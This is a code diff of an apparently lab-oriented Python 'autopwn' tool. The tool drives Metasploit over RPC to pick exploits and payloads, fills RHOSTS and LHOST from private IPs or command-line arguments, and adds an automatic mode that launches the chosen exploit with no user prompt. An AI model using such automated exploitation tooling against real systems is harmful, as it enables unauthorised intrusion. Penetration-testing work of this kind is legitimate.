@@ -204,7 +204,7 @@ def selectPayloadMS(client: MsfRpcClient, payload_fullname: str) -> PayloadModul
     return client.modules.use("payload", payload_fullname)
 
 
-def exploitVuln(client=None, modlist=[]) -> None:
+def exploitVuln(Rhosts="192.168.1.45", Lhost="192.168.1.37", auto_mode=False, client=None, modlist=[]) -> None:
     """Execute selected payload on the targeted"""
     exploit = client.modules.use(modlist[0]["type"], modlist[0]["fullname"])
     print("[V] Selected payloads: ", exploit.info)
@@ -217,7 +217,7 @@ def exploitVuln(client=None, modlist=[]) -> None:
     print("[~] Available payloads :")
     pprint.pprint(plds)
     print("[-1 for autochosing]")
-    if (auto_mode == 1) :
+    if auto_mode :
         pay_idx = -1
     else : 
         pay_idx = int(input("Which payload do you want to use ? :"))
@@ -238,10 +238,20 @@ def exploitVuln(client=None, modlist=[]) -> None:
     print("\n")
 
     for i in payload.missing_required:
-        payload[i] = input(i + ": ")
+        if (i == "RHOSTS") : 
+            payload[i] = Rhosts
+        elif (i == "LHOST") : 
+            payload[i] = Lhost
+        else :
+            payload[i] = input(i + ": ")
 
     for i in exploit.missing_required:
-        exploit[i] = input(i + ": ")
+        if (i == "RHOSTS") : 
+            exploit[i] = Rhosts
+        elif (i == "LHOST") : 
+            exploit[i] = Lhost
+        else : 
+            exploit[i] = input(i + ": ")
 
     print(exploit.execute(payload=payload))
 
@@ -287,7 +297,8 @@ def flushProcesses() -> int:
     return 0
 
 
-def autopwn(
+def autopwn(Rhosts="192.168.1.45",
+    Lhost="192.168.1.37",
     generic_exploit=True,
     get_edb_exploits=False,
     com_and_cont=False,
@@ -330,19 +341,14 @@ def autopwn(
             LOG("INFO : No exploit found on Metasploit.", logfile, "inf")
             print("[i] INFO : No exploit found on Metasploit.")
         LOG("Displayed possible exploits to user", logfile, "log")
-
+        
+        
     if auto_mode:
-        choice = -1
+        choice = "-1"
         print("[i] Automatic mode activated ! Selecting best exploit for you.")
     else:
         choice = input("[~] Please select an exploit: ")
-
-        LOG("Error 3 : No exploit found on Metasploit.", logfile, "err")
-        print("[X] Error 3 : No exploit found on Metasploit.")
-        exit(-3)
-    LOG("Displayed possible exploits to user", logfile, "log")
-    print("[-1 for autochosing]\n")
-    choice = input("[~] Please select an exploit: ")
+  
     if (choice == "-1") : 
         choice = str(autoexploit.autochose(metaexploits))
         if ( choice == "-1") :
@@ -385,13 +391,18 @@ if __name__ == "__main__":
     if debug == 1:
         print("**** RUNNING IN DEBUG MODE ****")
 
-    flushProcesses()
 
+    flushProcesses()
+    
+    
     if len(sys.argv) > 1:
         IP = sys.argv[1]
+        Rhosts = sys.argv[1]
+        if len(sys.argv) > 2:
+            Lhost = sys.argv[2]
 
     (shell, client, srv) = autopwn(
-        Rhost,Lhost,generic_exploit=True, get_edb_exploits=True, com_and_cont=True, auto_mode=False
+        Rhosts="192.168.1.45",Lhost="192.168.1.37",generic_exploit=True, get_edb_exploits=True, com_and_cont=True, auto_mode=False
     )
 
     sequence = [
